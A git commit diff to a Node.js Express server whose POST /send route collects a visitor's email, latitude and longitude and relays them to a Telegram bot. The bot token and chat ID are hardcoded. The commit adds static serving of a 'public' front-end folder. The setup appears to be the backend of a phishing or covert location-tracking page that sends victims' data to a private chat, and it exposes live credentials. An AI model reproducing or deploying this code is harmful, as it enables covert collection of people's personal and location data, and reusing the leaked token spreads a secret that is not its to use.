5837bc8ffefd058157dc4c0e5907b37aa453e0b8
joaovllima <jl949615@gmail.com>
2025-04-08 15:56:11 -0300

    08/04

--- src/index.js
+++ src/index.js
@@ -1,18 +1,28 @@
+
 import express from 'express';
 import fetch from 'node-fetch';
-import cors from 'cors'; 
+import cors from 'cors';
+import path from 'path';
+import { fileURLToPath } from 'url';
 
 const app = express();
 const port = process.env.PORT || 3000;
-
 
 // Configurações do Telegram
 const TELEGRAM_TOKEN = '7359276298:AAFKWa0pEZU9WY0FwnkC-drQDNVQxQZXtLc';
 const CHAT_ID = '5379369411';
 
+// Correção para usar __dirname com ESModules
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+
+// Middlewares
 app.use(cors());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
+
+//Servindo arquivos estáticos (HTML, CSS, JS) da pasta "public"
+app.use(express.static(path.join(__dirname, '../public')));
 
 // Rota que recebe o POST com email, lat, lng
 app.post('/send', async (req, res) => {
@@ -21,7 +31,6 @@ app.post('/send', async (req, res) => {
   const lng = req.body.lng || 'desconhecido';
 
   const mensagem = `Novo acesso com localização:\n\nEmail: ${email}\nLatitude: ${lat}\nLongitude: ${lng}`;
-
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
   try {
@@ -47,6 +56,7 @@ app.post('/send', async (req, res) => {
   }
 });
 
+// Inicia o servidor
 app.listen(port, () => {
   console.log(`Servidor rodando em http://localhost:${port}`);
 });
